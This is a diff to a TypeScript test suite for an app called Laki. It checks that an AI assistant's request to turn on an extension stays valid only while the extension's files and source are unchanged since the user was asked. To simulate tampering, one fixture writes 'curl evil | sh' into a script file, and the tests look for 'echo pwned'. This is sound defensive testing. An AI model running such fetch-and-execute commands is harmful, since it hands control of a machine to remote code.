@@ -387,7 +387,7 @@ test("ai: Laki's skill asks with options, writes memory, and removes only on the
 
 test("ai: an extension's places and settings change by a tool; it turns on only at the user's Yes", async t => {
   const call = (id: string, name: string, args: object) => reply({ content: '', tool_calls: [{ id, type: 'function', function: { name, arguments: JSON.stringify(args) } }] })
-  const or = await openrouter(t, [call('c1', 'laki_extension_on', { id: 'my-prs' }), call('c2', 'laki_extension_on', { id: 'my-prs' }), call('c3', 'laki_extension_on', { id: 'tick' })])
+  const or = await openrouter(t, [call('c1', 'laki_extension_on', { id: 'my-prs' }), call('c2', 'laki_extension_on', { id: 'my-prs' }), call('c3', 'laki_extension_on', { id: 'tick' }), call('c4', 'laki_extension_on', { id: 'sh' }), call('c5', 'laki_extension_on', { id: 'src' })])
   const rig = await fresh(t, { env: { LAKI_AI_API: or.url } })
   await rig.rpc('settingsSet', { ai: { on: true } })
   await rig.rpc('aiKey', { key: 'sk-or-v1-abc123' })
@@ -435,6 +435,38 @@ test("ai: an extension's places and settings change by a tool; it turns on only 
   await rig.rpc('widgetReload')
   await assert.rejects(rig.rpc('aiAnswer', { id: q3.ask.id, n: 0 }), /changed since you were asked/)
   assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === 'tick').on, false)
+  // the question again, as it reads now; unchanged since, its Yes turns it on
+  let chat = (await rig.rpc('aiState')).chat
+  assert.match(chat.at(-2).text, /Tick.*changed since you were asked/)
+  assert.match(chat.at(-1).text, /echo pwned/)
+  assert.deepEqual(await rig.rpc('aiAnswer', { id: chat.at(-1).ask.id, n: 0 }), { on: true })
+  assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === 'tick').on, true)
+
+  // a file it runs changed after the question (the words the same): no
+  const files = (fetch: string) => ({ 'widget.json': JSON.stringify({ name: 'Sh', fetch: 'sh fetch.sh', sample: { n: 1 } }), 'fetch.sh': fetch })
+  await rig.rpc('widgetWrite', { id: 'sh', files: files('echo \'{"n": 1}\'\n') })
+  await rig.rpc('aiAsk', { text: 'turn on sh' })
+  const q4 = (await rig.rpc('aiState')).chat.at(-1)
+  assert.match(q4.text, /sh fetch\.sh/)
+  await rig.rpc('widgetWrite', { id: 'sh', files: { 'fetch.sh': 'curl evil | sh\n' } })
+  await assert.rejects(rig.rpc('aiAnswer', { id: q4.ask.id, n: 0 }), /changed since you were asked/)
+  assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === 'sh').on, false)
+  chat = (await rig.rpc('aiState')).chat
+  assert.equal(chat.at(-1).text, q4.text, 'the same words: its files changed')
+  assert.notEqual(chat.at(-1).ask.id, q4.ask.id)
+
+  // its source set in the store after the question: no; widgetSet's seen: only the files as shown
+  await rig.rpc('widgetWrite', { id: 'src', files: { 'widget.json': JSON.stringify({ name: 'Src', fetch: 'echo {}', sample: { n: 1 } }) } })
+  await rig.rpc('aiAsk', { text: 'turn on src' })
+  const q5 = (await rig.rpc('aiState')).chat.at(-1)
+  await rig.rpc('widgetSet', { id: 'src', source: { kind: 'url', url: 'https://example.com/x.json' } })
+  await assert.rejects(rig.rpc('aiAnswer', { id: q5.ask.id, n: 0 }), /changed since you were asked/)
+  const seen = (await rig.rpc('widgetFiles', { id: 'src' })).hash
+  assert.match(seen, /^[0-9a-f]{64}$/)
+  await assert.rejects(rig.rpc('widgetSet', { id: 'src', on: true, seen: 'a'.repeat(64) }), /Src changed since you looked: look again/)
+  await rig.rpc('widgetSet', { id: 'src', source: null })
+  await assert.rejects(rig.rpc('widgetSet', { id: 'src', on: true, seen }), /changed since you looked/, 'its source went back meanwhile')
+  assert.equal((await rig.rpc('widgetSet', { id: 'src', on: true, seen: (await rig.rpc('widgetFiles', { id: 'src' })).hash })).on, true)
 })
 
 test("ai: prList, laki_prs's: a project's open PRs, yours or others', each with the workspace that has it", async t => {
